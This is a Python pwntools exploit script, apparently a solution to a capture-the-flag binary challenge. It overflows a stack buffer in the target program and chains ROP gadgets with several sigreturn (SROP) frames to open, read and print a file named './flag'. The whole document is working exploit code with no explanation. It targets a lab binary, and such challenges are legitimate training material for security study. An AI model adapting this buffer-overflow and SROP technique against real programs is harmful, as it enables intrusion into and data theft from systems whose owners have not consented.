from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process(["./ld-2.27.so","./pwn"], env = {"LD_PRELOAD":"./libc-2.27.so"})
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b''

bss = elf.bss() + 0x200
rdi = 0x0000000000400813 # pop rdi ; ret
rsi = 0x0000000000400811 # pop rsi ; pop r15 ; ret
syscall = 0x4005B0
sig_r = SigreturnFrame()
sig_r.rdi = 0
sig_r.rsi = 0
sig_r.rdx = bss
sig_r.rcx = 0x1000
sig_r.rsp = bss + 8
sig_r.rip = syscall

pay = b'A'*0x30 + p64(0xdeadbeef) + p64(rdi) + p64(15) + p64(rsi) + p64(0)*2 + p64(syscall) + bytes(sig_r) 
sla(b'2023!', pay)

sig_o = SigreturnFrame()
sig_o.rdi = 2
sig_o.rsi = bss
sig_o.rdx = 0
sig_o.rcx = 0
sig_o.rsp = bss + 0x130
sig_o.rip = syscall

sig_r = SigreturnFrame()
sig_r.rdi = 0
sig_r.rsi = 3
sig_r.rdx = bss - 0x100
sig_r.rcx = 0x50
sig_r.rsp = bss + 0x258
sig_r.rip = syscall

sig_w = SigreturnFrame()
sig_w.rdi = 1
sig_w.rsi = 1
sig_w.rdx = bss - 0x100
sig_w.rcx = 0x50
sig_w.rsp = bss
sig_w.rip = syscall

#debug()
pay = b'./flag\x00\x00' +  p64(rdi) + p64(15) + p64(rsi) + p64(0)*2 + p64(syscall) + bytes(sig_o)
pay += p64(rdi) + p64(15) + p64(rsi) + p64(0)*2 + p64(syscall) + bytes(sig_r)
pay += p64(rdi) + p64(15) + p64(rsi) + p64(0)*2 + p64(syscall) + bytes(sig_w)
sl(pay)
#debug()
sh()
